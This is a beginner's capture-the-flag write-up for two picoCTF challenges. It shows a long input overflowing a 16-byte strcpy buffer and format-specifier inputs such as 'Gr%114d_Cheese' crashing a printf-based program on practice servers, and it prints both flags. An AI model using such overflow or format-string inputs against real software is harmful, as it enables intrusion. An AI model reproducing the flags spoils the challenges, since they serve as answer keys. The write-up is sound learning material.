# 1. buffer overflow 0
This challenge involves exploiting a buffer overflow vulnerability in a given program. We are also given access to the source code, which helps in understanding how the buffer is handled and where the vulnerability lies.

## Solution:
1. First I received the two files: `vuln` and `vuln.c`. I opened vuln.c with vim to understand how the program works. Reading the source code - I noticed that it asks for a flag.txt file. Nothing was understandable from that.
    <img width="1920" height="983" alt="image (2)" src="https://github.com/user-attachments/assets/e87a9a3b-ae6c-44ac-b753-64b3338990f5" />

2. So I tried running the `vuln` program directly. So I changed its permissions to make it executable.
3. It prompted for input, but I was not sure what to input yet.
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ chmod +x vuln

    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ ./vuln
    Please create 'flag.txt' in this directory with your own debugging flag.
    ```
4. Next, I connected to the challenge server via netcat using `nc saturn.picoctf.net 54577`. The server takes input so I gave - "Input: 93874" and then printed "The program will exit now."
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ nc saturn.picoctf.net 54577
    Input: 93874
    ```
5. I was not able to figure out. I tried reading the code again.
6. I reviewed the source code again, focusing on functions like `strcpy` and `gets` - which are known to be unsafe as they dont perform bounds checking(I got to know in PPS class). I saw that `strcpy(buf2, input)` was used, and `buf2` had a fixed size of 16 bytes.
7. So I prepared an input string longer than 16 characters to overflow `buf2`.
8. I made the previous command run again and wrote any random string greater than 16. This caused the program to respond with the flag:
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ nc saturn.picoctf.net 54577
    Input: 039485704398732094873409873294870987534987
    picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
    ```

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:
- Understanding how buffer overflows work and how unsafe functions like `strcpy` and `gets` can be exploited.

## Notes:
- I was initially trying to create a random flag file, but since the title was overflow i resisted it and started thinking the other way.
- I also thought about using `gdb` to analyze the binary and after doing a little came back.

## Resources:
- Only Google to get some search about strcpy.
<<<<<<< HEAD
- Later when I opened hint the `man gets` and under that BUGS section was stated.








# 2. format string 0
This challenge involves exploiting format string vulnerabilities in a binary program. The program prompts the user to recommend burgers from a list, but the input is processed using a printf like function.

## Solution:
1. I started by downloading the source code and binary to analyze the programs behavior. I tried to understand the code but not in very detail as last question instead of going and running through the binary second file I connected to the challenge server using `nc mimas.picoctf.net 55252`.
2. Then the game started where something options was given out of 3, I first tried and guessed wrong.
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/formatstring0]
    └─$ nc mimas.picoctf.net 55252
    Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
    Here comes the first customer Patrick who wants a giant bite.
    Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
    Enter your recommendation: Breakf@st_Burger
    Breakf@st_BurgerPatrick is still hungry!
    Try to serve him something of larger size!
    ```
3. I played it again, But this time something odd was there in options. Since string was to be there as in challenge title, so it remembered me of `%s` in C programming.Thus I selected the option - `Gr%114d_Cheese`
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/formatstring0]
    └─$ nc mimas.picoctf.net 55252
    Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
    Here comes the first customer Patrick who wants a giant bite.
    Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
    Enter your recommendation: Gr%114d_Cheese
    Gr                                                                                                           4202954_Cheese
    Good job! Patrick is happy! Now can you serve the second customer?
    Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
    Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
    Enter your recommendation:
    ```
4. Now for next option - option 1 and 3 both have `%s`, so I tried out 3rd as it has more number of %s(which was illogical...) but I got my flag.
    ```bash
    Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
    Enter your recommendation: Cla%sic_Che%s%steak
    ClaCla%sic_Che%s%steakic_Che(null)
    picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
    ```

## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
```

## Concepts learnt:
- Understanding how format string vulnerabilities work in C programming.
- Learning that format specifiers like `%s`, `%d`, and `%114d` can be used to read or manipulate memory.

## Notes:
After many google searches and refernces I tried to found out the reason and found that - 
```C
if (count > 2 * BUFSIZE) {
    serve_bob();
}
```
This code is checking greater than 64 bytes as BUFSIZE is 32 bytes. So our `Gr%114d_Cheese` is greater than 64 as the `%114d` is a format specifier in "Gr%114d_Cheese". When printf encounters %114d, it expects to print a number with a width of 114 characters.
And for second part I dont get any best answer but I think - `%t` is valid but here in `%s` there were lot more character after that like - `%steak` is not valid as %s still tries to process it.

## Resources:
- [Format String Exploits in C](https://owasp.org/www-community/attacks/Format_string_attack)